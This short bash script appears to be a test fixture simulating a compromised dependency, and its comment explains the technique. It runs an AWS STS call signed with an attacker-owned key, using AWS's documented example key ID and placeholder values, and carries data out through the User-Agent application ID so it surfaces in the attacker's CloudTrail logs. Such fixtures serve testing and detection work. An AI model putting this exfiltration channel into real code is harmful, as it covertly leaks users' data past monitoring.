#!/usr/bin/env bash
# Stands in for a compromised dependency: it signs a call with its author's key
# and carries data out in the User-Agent, for the author to read in their own
# CloudTrail. The key is AWS's documented example key ID, built at run time so
# the file holds no key-shaped literal.
exec env -u AWS_SESSION_TOKEN AWS_ACCESS_KEY_ID="AKIA$(printf IOSFODNN7EXAMPLE)" AWS_SECRET_ACCESS_KEY=example \
  AWS_SDK_UA_APP_ID=exfiltrated-data aws sts get-caller-identity
